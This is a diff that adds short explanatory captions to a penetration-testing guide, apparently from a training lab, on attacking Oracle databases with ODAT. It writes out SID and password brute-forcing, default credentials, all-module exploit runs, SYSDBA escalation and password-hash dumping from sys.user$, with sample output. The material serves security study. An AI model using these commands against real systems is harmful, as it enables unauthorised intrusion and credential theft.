@@ -230,6 +230,7 @@ cd ~/odat
 # Step 6: Fix the shebang for venv compatibility
 sed -i '1s|#!/usr/bin/python|#!/usr/bin/env python3|' odat.py
 ```
+> One-time ODAT install on Kali ARM64: system deps, Oracle Instant Client, cx_Oracle from source, the ODAT repo, and a venv. Adjust the Instant Client/cx_Oracle versions and Python path to match your distro.
 
 ### Running ODAT
 
@@ -238,6 +239,7 @@ cd ~/odat
 source venv/bin/activate
 python3 odat.py -h
 ```
+> Activates the ODAT virtualenv and prints its help/module list to confirm the install works. Run from the ODAT directory; no values to change.
 
 > **Note:** Always use `python3 odat.py` (not `./odat.py`) because the default shebang points to `#!/usr/bin/python` which bypasses the venv. Fix the shebang with the sed command above to use `./odat.py` directly.
 
@@ -294,6 +296,7 @@ python3 odat.py passwordstealer -s <target_ip> -p 1521 -d <SID> -U <user> -P <pa
 # Search for keywords in DB
 python3 odat.py search -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --keywords "password,credit_card,ssn"
 ```
+> Reference set of ODAT module invocations (scan-all, SID guess, password guess, Java exec, file up/download, hash steal, keyword search). Replace `<target_ip>`, `<SID>`, `<user>`, `<pass>` with your values.
 
 ### ODAT Quick Navigation Guide
 
@@ -305,6 +308,7 @@ Always run ODAT from its install directory. The `sidguesser` and `passwordguesse
 cd ~/odat && source venv/bin/activate
 python3 odat.py -h
 ```
+> Always launch ODAT from its install dir so module wordlists resolve correctly; activates the venv and shows help. No values to change.
 
 #### Step-by-Step Attack Flow
 
@@ -325,6 +329,7 @@ python3 odat.py tnscmd -s <target_ip> -p 1521 --ping
 python3 odat.py tnscmd -s <target_ip> -p 1521 --version
 python3 odat.py tnscmd -s <target_ip> -p 1521 --status
 ```
+> Confirms Oracle TNS is reachable: Nmap version-scans port 1521, then ODAT `tnscmd` pings the listener and queries its version/status. Replace `<target_ip>` with your target IP.
 
 #### Phase 2: Enumerate SIDs
 
@@ -337,6 +342,7 @@ python3 odat.py sidguesser -s <target_ip> -p 1521
 # Nmap SID brute
 sudo nmap -p1521 --script oracle-sid-brute <target_ip>
 ```
+> Brute-forces the database SID (required before authenticating) via ODAT's built-in wordlist or the Nmap `oracle-sid-brute` script. Replace `<target_ip>` with your target IP.
 
 Common SIDs to try manually: `XE`, `ORCL`, `ORCLCDB`, `ORCLPDB1`, `PLSExtProc`
 
@@ -351,6 +357,7 @@ python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>
 # Use a custom username/password list
 python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID> --accounts-file accounts.txt
 ```
+> Once you have a valid SID, brute-force credentials with ODAT's default account list or a custom `accounts.txt`. Replace `<target_ip>` and `<SID>`, and point `--accounts-file` at your list.
 
 Default accounts to remember: `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp`
 
@@ -362,6 +369,7 @@ Once you have creds + SID, the real fun begins. Choose your module:
 # Run ALL exploit modules at once (noisy but thorough)
 python3 odat.py all -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>
 ```
+> Runs every ODAT exploit module against the target with valid creds + SID — thorough but loud. Replace `<target_ip>`, `<SID>`, `<user>`, `<pass>` with your values; add `--sysdba` if the account can use it.
 
 Or pick specific modules:
 
@@ -400,6 +408,7 @@ Or pick specific modules:
 ```bash
 sudo nmap -p1521 -sV 10.129.204.235 --open
 ```
+> Version-scans Oracle's default port 1521, showing only open ports, to confirm the TNS listener and its version. Swap `10.129.204.235` for your target IP.
 
 ```
 PORT     STATE SERVICE    VERSION
@@ -411,6 +420,7 @@ PORT     STATE SERVICE    VERSION
 ```bash
 sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 ```
+> Adds the `oracle-sid-brute` NSE script to discover valid SIDs on the listener. Swap `10.129.204.235` for your target IP.
 
 ```
 PORT     STATE SERVICE    VERSION
@@ -424,6 +434,7 @@ PORT     STATE SERVICE    VERSION
 ```bash
 ./odat.py all -s 10.129.204.235
 ```
+> Runs all ODAT modules (including SID and password guessing) against the target with no creds supplied. Swap `10.129.204.235` for your target IP.
 
 ```
 [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
@@ -460,6 +471,7 @@ Once valid credentials are found (e.g., `scott/tiger`), connect using SQLplus:
 ```bash
 sqlplus scott/tiger@10.129.204.235/XE
 ```
+> Connects interactively to the Oracle DB with `user/pass@host/SID`. Swap `scott/tiger` for valid creds, `10.129.204.235` for your target IP, and `XE` for the SID.
 
 ```
 SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
@@ -484,6 +496,7 @@ If you encounter: `sqlplus: error while loading shared libraries: libsqlplus.so:
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
 sudo ldconfig
 ```
+> Fixes the `libsqlplus.so: cannot open shared object file` error by registering the Instant Client lib path with the dynamic linker. Adjust the version path to match your installed Instant Client.
 
 ---
 
@@ -493,7 +506,9 @@ sudo ldconfig
 
 ```sql
 SQL> select table_name from all_tables;
-
+```
+> Run at the `SQL>` prompt to list every table the current user can see — your starting point for data hunting. No values to change.
+```
 TABLE_NAME
 ------------------------------
 DUAL
@@ -514,7 +529,9 @@ HELP
 
 ```sql
 SQL> select * from user_role_privs;
-
+```
+> Run at the `SQL>` prompt to see the current user's granted roles — check whether you have DBA or only CONNECT/RESOURCE. No values to change.
+```
 USERNAME                       GRANTED_ROLE                   ADM DEF OS_
 ------------------------------ ------------------------------ --- --- ---
 SCOTT                          CONNECT                        NO  YES NO
@@ -530,6 +547,7 @@ Try connecting as System Database Admin (sysdba) for higher privileges:
 ```bash
 sqlplus scott/tiger@10.129.204.235/XE as sysdba
 ```
+> Reconnects with the `as sysdba` clause — many low-priv Oracle accounts can still log in as SYSDBA for full DBA access. Swap creds, IP, and SID for your values.
 
 ```
 Connected to:
@@ -559,7 +577,9 @@ With sysdba access, extract password hashes for offline cracking:
 
 ```sql
 SQL> select name, password from sys.user$;
-
+```
+> Run as SYSDBA to dump every account name and password hash from `sys.user$` for offline cracking. No values to change.
+```
 NAME                           PASSWORD
 ------------------------------ ------------------------------
 SYS                            FBA343E7D6C8BC9D
@@ -589,6 +609,7 @@ LOGSTDBY_ADMINISTRATOR
 ```bash
 sudo nmap -p1521 -sV 10.129.205.19 --open
 ```
+> Version-scans port 1521 to confirm the Oracle TNS listener before attacking. Swap `10.129.205.19` for your target IP.
 
 ### Step 2: SID Bruteforce with ODAT
 
@@ -596,6 +617,7 @@ sudo nmap -p1521 -sV 10.129.205.19 --open
 cd ~/odat && source venv/bin/activate
 python3 odat.py sidguesser -s 10.129.205.19 -p 1521
 ```
+> Activates the venv and brute-forces valid SIDs with ODAT's built-in wordlist. Swap `10.129.205.19` for your target IP.
 
 Result: Massive SID dump including `XE`, `ORCL`, `PROD`, `DB`, and hundreds more.
 
@@ -604,6 +626,7 @@ Result: Massive SID dump including `XE`, `ORCL`, `PROD`, `DB`, and hundreds more
 ```bash
 python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger
 ```
+> Runs all ODAT exploit modules with the discovered creds and SID but no `--sysdba` — shows what a low-priv account can do. Swap IP, SID, and creds for your values.
 
 Result: Almost everything returned **KO** - `scott/tiger` only has CONNECT and RESOURCE roles.
 
@@ -612,6 +635,7 @@ Result: Almost everything returned **KO** - `scott/tiger` only has CONNECT and R
 ```bash
 python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger --sysdba
 ```
+> Same all-modules run but with `--sysdba`, unlocking file read/write, command exec, and hash theft. Swap IP, SID, and creds for your values.
 
 Result: Nearly everything returned **OK**:
 
@@ -639,6 +663,7 @@ Result: Nearly everything returned **OK**:
 ```bash
 python3 odat.py passwordstealer -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --get-passwords
 ```
+> Extracts every Oracle account password hash via the `passwordstealer` module (`--get-passwords` also outputs hashcat/John formats). Swap IP, SID, and creds for your values.
 
 Result: All Oracle password hashes extracted:
 
